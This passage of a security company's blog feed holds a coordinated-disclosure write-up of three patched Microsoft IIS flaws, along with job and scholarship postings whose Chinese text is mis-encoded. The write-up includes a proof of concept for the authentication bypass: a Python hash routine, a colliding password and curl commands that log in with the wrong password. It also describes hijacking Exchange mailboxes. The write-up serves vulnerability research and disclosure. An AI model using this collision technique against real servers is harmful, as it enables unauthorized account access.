      &lt;li&gt;æƒ³è¦è¾¦ç†çš„æ´»å‹•æ–¹å¼&lt;/li&gt;
      &lt;li&gt;æ´»å‹•ç¸½é ç®—&lt;/li&gt;
      &lt;li&gt;é è¨ˆéœ€è¦è´ŠåŠ©é‡‘é¡&lt;/li&gt;
      &lt;li&gt;ä»£è¡¨äººå§“åã€é€£çµ¡é›»è©±&lt;/li&gt;
      &lt;li&gt;åœ˜é«”åç¨±&lt;/li&gt;
      &lt;li&gt;åœ˜é«”å–®ä½ç¶²å€&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;æ³¨æ„äº‹é …&lt;/strong&gt;ï¼š
    &lt;ul&gt;
      &lt;li&gt;ç”³è«‹æ¡ˆå¯©æ ¸å°‡ç¶“éæˆ´å¤«å¯‡çˆ¾å…§éƒ¨å¯©æ ¸æ©Ÿåˆ¶ï¼Œä¸¦ä¿æœ‰æœ€çµ‚æ ¸æ±ºæ¬Šã€‚&lt;/li&gt;
      &lt;li&gt;æœ¬å•å·åƒ…ä¾›åˆæ­¥æ„é¡˜è’é›†ç”¨é€”ï¼Œç¬¦åˆç”³è«‹è³‡æ ¼è€…ï¼Œæˆ´å¤«å¯‡çˆ¾å°‡æ–¼ 30 æ—¥å…§é€šçŸ¥æä¾›é€²ä¸€æ­¥è³‡æ–™ä¾›å¯©æ ¸ï¼Œå…¶é¤˜å°‡ä¸å¦è¡Œé€šçŸ¥ã€‚&lt;/li&gt;
      &lt;li&gt;æˆ´å¤«å¯‡çˆ¾ä¿æœ‰ä¿®æ”¹ã€æš«åœæˆ–çµ‚æ­¢æœ¬è´ŠåŠ©è¨ˆç•«ä¹‹æ¬Šåˆ©ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2022/08/26/2022-devcore-national-cyber-security-scholarship/</link>
                <guid>https://devco.re/blog/2022/08/26/2022-devcore-national-cyber-security-scholarship</guid>
                <pubDate>Fri, 26 Aug 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Let's Dance in the Cache - Destabilizing Hash Table on Microsoft IIS</title>
                <description>&lt;p&gt;Hi, this is my fifth time speaking at &lt;a href=&quot;https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199&quot;&gt;Black Hat USA&lt;/a&gt; and &lt;a href=&quot;https://forum.defcon.org/node/241837&quot;&gt;DEFCON&lt;/a&gt;. You can get the slide copy and video there:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-22/Wednesday/US-22-Tsai-Lets-Dance-in-the-Cache-Destabilizing-Hash-Table-on-Microsoft-IIS.pdf&quot;&gt;Letâ€™s Dance in the Cache - Destabilizing Hash Table on Microsoft IIS (slides)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#TBD&quot;&gt;Letâ€™s Dance in the Cache - Destabilizing Hash Table on Microsoft IIS (video - TBD)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As the most fundamental Data Structure in Computer Science, Hash Table is extensively used in Computer Infrastructures, such as Operating Systems, Programming Languages, Databases, and Web Servers. Also, because of its importance, Microsoft has designed its own Hash Table algorithm from a very early stage, and applied it heavily to its web server, IIS.&lt;/p&gt;

&lt;p&gt;Since IIS does not release its source code, I guess the algorithm implementation details should be an unexplored area to discover bugs. Therefore, &lt;strong&gt;this research mainly focuses on the Hash Table implementation and its usage&lt;/strong&gt;. We also look into the Cache mechanism because most of the Hash Table usages in IIS are Cache-Related!&lt;/p&gt;

&lt;p&gt;Because most of the details are in the slides, please forgive me this time for this brief write-ups instead of a full blog.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-22025&quot;&gt;CVE-2022-22025&lt;/a&gt; - Microsoft IIS Hash-Flooding DoS&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-22040&quot;&gt;CVE-2022-22040&lt;/a&gt; - Microsoft IIS Cache Poisoning Attack&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30209&quot;&gt;CVE-2022-30209&lt;/a&gt; - Microsoft IIS Authentication Bypass&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. All vulnerabilities addressed in this blog have been reported responsibly to Microsoft and patched in July 2022.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-iis-hash-flooding-dos&quot;&gt;1. IIS Hash-Flooding DoS&lt;/h2&gt;

&lt;p&gt;Itâ€™s hard to imagine that we can still see such a classic Algorithmic Complexity Attack as Hash-Flooding Attack in IIS in 2022. Although Microsoft has configured a thread deleting outdated records every 30 seconds to mitigate the attack, we still found a key-splitting bug in the implementation to &lt;strong&gt;amplify our power by over 10 times to defeat the guardian by zero hashes&lt;/strong&gt;. Through this bug we can &lt;strong&gt;make a default installed IIS Server unresponsive&lt;/strong&gt; with about 30 connections per second!&lt;/p&gt;

&lt;p&gt;Because this bug also qualifies for the &lt;a href=&quot;https://www.microsoft.com/en-us/msrc/bounty-windows-insider-preview&quot;&gt;Windows Insider Preview Bounty Program&lt;/a&gt;, we also rewarded $30,000 for this DoS. This is the maximum bounty for the category of Denial-of-Service!&lt;/p&gt;

&lt;p&gt;You can check the full demo video here:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/VtnDkzYPNCk&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;2-iis-cache-poisoning-attack&quot;&gt;2. IIS Cache Poisoning Attack&lt;/h2&gt;

&lt;p&gt;Compared with other &lt;a href=&quot;https://portswigger.net/research/practical-web-cache-poisoning&quot;&gt;marvelous Cache Poisoning research&lt;/a&gt;, this one is relatively plain. The bug is found in the component of Output Caching, the module responsible for caching dynamic responses to reduce expensive database or filesystem access on web stacks.&lt;/p&gt;

&lt;p&gt;Output Caching uses a bad Query String parser that only takes the first occurrence as the Cache-Key when Query String keys are duplicated. This behavior is actually not a problem independently. However, itâ€™s a trouble in the view of the whole architecture with the backend, ASP.NET. The backend concatenates the value of all repeated keys together, which leads to an inconsistency between parser behaviors. Therefore, &lt;strong&gt;a classic HTTP Parameter Pollution can make IIS cache the wrong result&lt;/strong&gt;!&lt;/p&gt;

&lt;h2 id=&quot;3-iis-authentication-bypass&quot;&gt;3. IIS Authentication Bypass&lt;/h2&gt;

&lt;p&gt;This may be the most interesting bug of this talk. LKRHash is a Hash Table algorithm designed and &lt;a href=&quot;https://patents.google.com/patent/US6578131&quot;&gt;patented&lt;/a&gt; by Microsoft in 1997. Itâ€™s based on &lt;a href=&quot;https://en.wikipedia.org/wiki/Linear_hashing&quot;&gt;Linear Hashing&lt;/a&gt; and created by &lt;a href=&quot;https://en.wikipedia.org/wiki/Paul_Larson&quot;&gt;Paul Larson&lt;/a&gt; of Microsoft Research, Murali Krishnan and George Reilly of the IIS team.&lt;/p&gt;

&lt;p&gt;LKRHash aims to build a scalable and high-concurrent Hash Table under the multithreading and multi-core environment. The creators put a lot of effort into making this implementation portable, flexible and customizable to adapt to multiple products across Microsoft. An application can define its own Table-Related functions, such as the Hash Function, the Key Extracting Function, or the Key Comparing Function. This kind of extensibility creates a bunch of opportunities for vulnerability mining. So, under this context, we cares more about the relationship between the records, the keys, and the functions.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;CLKRHashTable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CLKRHashTable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;TOKEN_CACHE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// An identifier for debugging&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pfnExtractKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// Extract key from record&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pfnCalcKeyHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Calculate hash signature of key&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pfnEqualKeys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// Compare two keys&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pfnAddRefRecord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// AddRef in FindKey, etc&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// Bound on the average chain length.&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;               &lt;span class=&quot;c1&quot;&gt;// Initial size of hash table.&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;               &lt;span class=&quot;c1&quot;&gt;// Number of subordinate hash tables.&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// Allow multiple identical keys?&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Because â€œLogonâ€ is an expensive operation, to improve the performance, IIS cached all tokens for password-based authentications, such as Basic Authentication by default, and the bug we found this time is located in the logic of the key-comparing function when a collision occurs.&lt;/p&gt;

&lt;p&gt;If a login attempt whose hash hits a key that is already in the cache, LKRHash enters the application-specific &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pfnEqualKeys&lt;/code&gt; function to determine whether the key is correct or not. The application-specific logic of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TokenCacheModule&lt;/code&gt; is as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220818/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As the logic compares several parts to make the decision, itâ€™s weird why IIS compares the username twice.&lt;/p&gt;

&lt;p&gt;I guess the original intent was to compare the password. However, the developer copy-and-pasted the code but forgot to replace the variable name. That leads to that &lt;strong&gt;an attacker can reuse another userâ€™s logged-in token with random passwords&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;To build the smallest PoC to test your own, you can create a testing account and configure the Basic Authentication on your IIS.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# add a test account, please ensure to remove that after testing&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; net user orange test-for-CVE-2022-30209-auth-bypass /add

&lt;span class=&quot;c&quot;&gt;# the source of login is not important, this can be done outside IIS.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-su&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;orange:test-for-CVE-2022-30209-auth-bypass&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://&amp;lt;iis&amp;gt;/protected/&apos;&lt;/span&gt; | findstr HTTP
HTTP/1.1 200 OK
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Under the attackerâ€™s terminal:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# script for sanity check&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;test.py
def HashString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;password&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
    j &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
    &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;c &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;map&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ord, password&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
        j &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; c + &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;101&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;j&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;amp;0xffffffff
    &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;j

assert HashString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;test-for-CVE-2022-30209-auth-bypass&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; HashString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;ZeeiJT&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# before the successful login&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-su&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;orange:ZeeiJT&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://&amp;lt;iis&amp;gt;/protected/&apos;&lt;/span&gt; | findstr HTTP
HTTP/1.1 401 Unauthorized

&lt;span class=&quot;c&quot;&gt;# after the successful login&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-su&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;orange:ZeeiJT&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://&amp;lt;iis&amp;gt;/protected/&apos;&lt;/span&gt; | findstr HTTP
HTTP/1.1 200 OK
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, the attacker can log into the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;orange&lt;/code&gt; with another password whose hash is the same as the original one.&lt;/p&gt;

&lt;p&gt;However, itâ€™s not easy to collide the hash. The probability of each attempt is only worth 1/2^32 because the hash is a 32-Bit Integer, and the attacker has no way to know the hash of existing cache keys. Itâ€™s a ridiculous number to make exploiting this bug like playing a lottery. The only pro is that the attempt costs nothing, and you have unlimited tries!&lt;/p&gt;

&lt;p&gt;To make this bug more practical, we proposed several ways to win the lottery, such as:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Increase the odds of the collision - LKRHash combined LCGs to scramble the result to make the hash more random. However, we can lower the key space because the LCG is not one-to-one mapping under the 32-Bit Integer. There must be results that will never appear so that we can pre-compute a dictionary that excludes the password whose hash is not in the results and &lt;strong&gt;increase the success rate by 13% at least&lt;/strong&gt;!&lt;/li&gt;
  &lt;li&gt;Regain the initiative - By understanding the root cause, we brainstorm several use cases that &lt;strong&gt;can cache the token in memory forever and no longer wait for user interaction&lt;/strong&gt;, such as the IIS feature &lt;a href=&quot;https://docs.microsoft.com/en-us/troubleshoot/developer/webapps/iis/www-authentication-authorization/understanding-identities&quot;&gt;Connect As&lt;/a&gt; or leveraging software design patterns.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;We have also proved this attack works naturally on Microsoft Exchange Server. By leveraging the default activated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exchange Active Monitoring&lt;/code&gt; service, we can enter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HealthMailbox&lt;/code&gt;â€™s mailbox without passwords! This authentication-less account hijacking is useful for further exploitations such as phishing or chaining another post-auth RCE together!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220818/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Mar 16, 2022 - We reported the IIS Cache Poisoning to Microsoft through the MSRC portal.&lt;/li&gt;
  &lt;li&gt;Apr 09, 2022 - We reported the IIS Hash-Flooding DoS to Microsoft through the MSRC portal.&lt;/li&gt;
  &lt;li&gt;Apr 10, 2022 - We reported the IIS Authentication Bypass to Microsoft through the MSRC portal.&lt;/li&gt;
  &lt;li&gt;Jul 12, 2022 - Microsoft fixed everything at Julyâ€™s Patch Tuesday.&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2022/08/18/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis/</link>
                <guid>https://devco.re/blog/2022/08/18/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis</guid>
                <pubDate>Thu, 18 Aug 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2022 ç¬¬äºŒå±†å¯¦ç¿’ç”Ÿè¨ˆç•«</title>
                <description>&lt;p&gt;DEVCORE è‡ª 2012 æˆç«‹ä»¥ä¾†å·²é‚å‘ç¬¬åå¹´ï¼Œæˆ‘å€‘å¾ˆé‡è¦–å°ç£çš„è³‡å®‰ï¼Œä¹Ÿå°ˆæ³¨æ‰¾å‡ºæœ€åš´é‡çš„å¼±é»ä»¥ä¿è­·ä¸–ç•Œã€‚é›–ç„¶å…¬å¸è¦æ¨¡æ“´å¼µä¸å¿«ï¼Œä½†åœ¨æ¼¸æ¼¸ç«™ç©©è…³æ­¥çš„åŒæ™‚ï¼Œæˆ‘å€‘ä»ä¸å¿˜åˆè¡·ï¼šå¾ 2020 é–‹å§‹åœ¨è¼”å¤§ã€å°ç§‘å¤§æˆç«‹è³‡å®‰çå­¸é‡‘ï¼›åœ¨ 2021 å¹´æœ«æ“´å¤§&lt;a href=&quot;https://devco.re/company/jobs/&quot;&gt;å¾µæ‰&lt;/a&gt;ï¼Œæƒ³æ‰¾å°‹æœ‰è‘—ç›¸åŒç†å¿µçš„äººæ‰ä¸€èµ·å¥®é¬¥ï¼›ä»Šå¹´å¹´åˆï¼Œæˆ‘å€‘é–‹å§‹å˜—è©¦èˆ‰è¾¦ç¬¬ä¸€å±†å¯¦ç¿’ç”Ÿè¨ˆç•«ï¼Œå¸Œæœ›åŸ¹è‚²äººæ‰ã€å¢å¼·æ–°ä¸–ä»£çš„è³‡å®‰æŠ€èƒ½ï¼Œæœ€çµ‚æˆæœä¹Ÿè¶…ä¹é æœŸã€‚æ–¼æ˜¯æˆ‘å€‘æ±ºå®šåœ¨ä»Šå¹´ 9 æœˆé€²è¡Œç¬¬äºŒå±†å¯¦ç¿’ç”Ÿè¨ˆç•«ï¼Œå¦‚æœæ‚¨å°é€™å€‹è¨ˆç•«æœ‰èˆˆè¶£ï¼Œæ­¡è¿ä¾†ä¿¡å ±åï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å¯¦ç¿’å…§å®¹&quot;&gt;å¯¦ç¿’å…§å®¹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡å¯¦ç¿’åˆ†ç‚º Binary åŠ Web å…©å€‹çµ„åˆ¥ï¼Œä¸»è¦å…§å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
ä»¥ç ”ç©¶ç‚ºä¸»ï¼Œåœ¨èˆ‡å°å¸«ç¢ºå®šç ”ç©¶æ¨™çš„å¾Œï¼Œåˆ†æç›®æ¨™æ¶æ§‹ã€é€²è¡Œé€†å‘å·¥ç¨‹æˆ–ç¨‹å¼ç¢¼å¯©æŸ¥ã€‚è—‰ç”±é€™å€‹éç¨‹è¨“ç·´è‡ªå·±çš„æ€è·¯ï¼Œæ‰¾å‡ºå¯èƒ½çš„æ”»æ“Šé¢èˆ‡æ½›åœ¨çš„å¼±é»ã€‚å¦å¤–ä¹Ÿæœƒè®“å¤§å®¶å˜—è©¦å¯«éå¾€æ¼æ´çš„ Exploit ç†è§£éå»æ¼æ´éƒ½å‡ºç¾åœ¨å“ªï¼Œé«”é©—çœŸå¯¦ä¸–ç•Œçš„æ¼æ´éƒ½æ˜¯å¦‚ä½•åˆ©ç”¨ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´æŒ–æ˜åŠç ”ç©¶ 70 %&lt;/li&gt;
      &lt;li&gt;1-day é–‹ç™¼ (Exploitation) 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
ä¸»è¦å…§å®¹ç‚ºåœ¨å°å¸«æŒ‡å¼•èˆ‡è¼”ä½ä¸‹ç ”ç©¶éå¾€æ¼æ´èˆ‡è¿‘å¹´å¸¸è¦‹æ–°å‹æ…‹æ¼æ´ã€æ”»æ“Šæ‰‹æ³•ï¼Œéœ€è¦è£½ä½œæŠ•å½±ç‰‡ä»‹ç´¹æˆæœä¸¦å»ºç½®å¯ä¾›ä»–äººé‡ç¾å¼±é»çš„æ¨¡æ“¬æ¸¬è©¦ç’°å¢ƒ (Lab)ï¼Œå¦å¯èƒ½éœ€è¦æ’°å¯«æˆ–ä¿®æ”¹å¯åˆ©ç”¨æ”»æ“Šç¨‹å¼é€²è¡Œå¼±é»é©—è­‰ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´åŠæ”»æ“Šæ‰‹æ³•ç ”ç©¶ 70%&lt;/li&gt;
      &lt;li&gt;å»ºç½® Lab 30%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å…¬å¸åœ°é»&quot;&gt;å…¬å¸åœ°é»&lt;/h3&gt;

&lt;p&gt;å°åŒ—å¸‚æ¾å±±å€å…«å¾·è·¯ä¸‰æ®µ 32 è™Ÿ 13 æ¨“&lt;/p&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ™‚é–“&quot;&gt;å¯¦ç¿’æ™‚é–“&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2022 å¹´ 9 æœˆé–‹å§‹åˆ° 2023 å¹´ 2 æœˆåº•ï¼Œå…± 6 å€‹æœˆã€‚
    &lt;ul&gt;
      &lt;li&gt;å‚™è¨»ï¼šè‹¥æ‡‰å¾µäººæ•¸éå¤šï¼Œæˆ‘å€‘è©•ä¼°ç„¡æ³•åœ¨ 08/26 å‰æ±ºå®šäººé¸ã€‚æ•´é«”å¯¦ç¿’æ™‚é–“å°‡æœƒé †å»¶ä¸€è‡³å…©é€±ï¼Œå±†æ™‚æœƒææ—©ç™¼ä¿¡é€šçŸ¥æ‰€æœ‰æ‡‰å¾µè€…ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;æ¯é€±å·¥ä½œå…©å¤©ï¼Œå·¥ä½œæ™‚é–“ç‚º 10:00 â€“ 18:00
    &lt;ul&gt;
      &lt;li&gt;æ¯é€±å›ºå®šä¸€å¤©ä¸‹åˆ 14:00 - 18:00 å¿…é ˆåˆ°å…¬å¸è¨è«–é€²åº¦&lt;/li&gt;
      &lt;li&gt;å…¶é¤˜æ™‚é–“çš†ç‚ºé ç«¯ä½œæ¥­&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‹›å‹Ÿå°è±¡&quot;&gt;æ‹›å‹Ÿå°è±¡&lt;/h3&gt;

&lt;p&gt;å¤§å°ˆé™¢æ ¡å¤§ä¸‰ï¼ˆå«ï¼‰ä»¥ä¸Šå…·æœ‰ä¸€å®šç¨‹åº¦è³‡å®‰èƒŒæ™¯çš„å­¸ç”Ÿ&lt;/p&gt;

&lt;h3 id=&quot;é è¨ˆæ‹›æ”¶åé¡&quot;&gt;é è¨ˆæ‹›æ”¶åé¡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary çµ„ï¼š2~3 äºº&lt;/li&gt;
  &lt;li&gt;Web çµ„ï¼š2~3 äºº&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è–ªè³‡å¾…é‡&quot;&gt;è–ªè³‡å¾…é‡&lt;/h3&gt;

&lt;p&gt;æ¯æœˆæ–°å°å¹£ 16,000 å…ƒ&lt;/p&gt;

&lt;h2 id=&quot;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&quot;&gt;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&lt;/h2&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ¢ä»¶è¦æ±‚&quot;&gt;å¯¦ç¿’æ¢ä»¶è¦æ±‚&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;åŸºæœ¬é€†å‘å·¥ç¨‹åŠé™¤éŒ¯èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;èƒ½çœ‹æ‡‚çµ„åˆèªè¨€ä¸¦ç­è§£åŸºæœ¬ Debugger ä½¿ç”¨æŠ€å·§&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŸºæœ¬æ¼æ´åˆ©ç”¨èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;é ˆçŸ¥é“ Stack overflowã€ROP ç­‰ç›¸é—œåˆ©ç”¨æŠ€å·§&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŸºæœ¬ Scripting Language é–‹ç™¼èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;Pythonã€Ruby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™åˆ†æå¤§å‹ Open Source å°ˆæ¡ˆèƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;ä»¥ C/C++ ç‚ºä¸»&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™åŸºç¤ä½œæ¥­ç³»çµ±çŸ¥è­˜
    &lt;ul&gt;
      &lt;li&gt;ä¾‹å¦‚çŸ¥é“ Virtual Address èˆ‡ Physical Address çš„æ¦‚å¿µ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;çŸ¥é“æ€æ¨£å¯«çš„ç¨‹å¼ç¢¼æœƒæœ‰å•é¡Œ
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;â€¦&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™ç ”ç©¶ç†±èª ï¼Œç¿’æ…£äº†è§£æŠ€è¡“æœ¬è³ª&lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;CTF æ¯”è³½ç¶“é©—&lt;/li&gt;
      &lt;li&gt;pwnable.tw æˆç¸¾&lt;/li&gt;
      &lt;li&gt;æ¨‚æ–¼åˆ†äº«æŠ€è¡“
        &lt;ul&gt;
          &lt;li&gt;æœ‰å…¬é–‹çš„æŠ€è¡“ blog/slideã€Write-ups æˆ–æ˜¯æ¼”è¬›&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ç²¾é€š IDA Pro æˆ– Ghidra&lt;/li&gt;
      &lt;li&gt;æœ‰å¯«é 1-day åˆ©ç”¨ç¨‹å¼&lt;/li&gt;
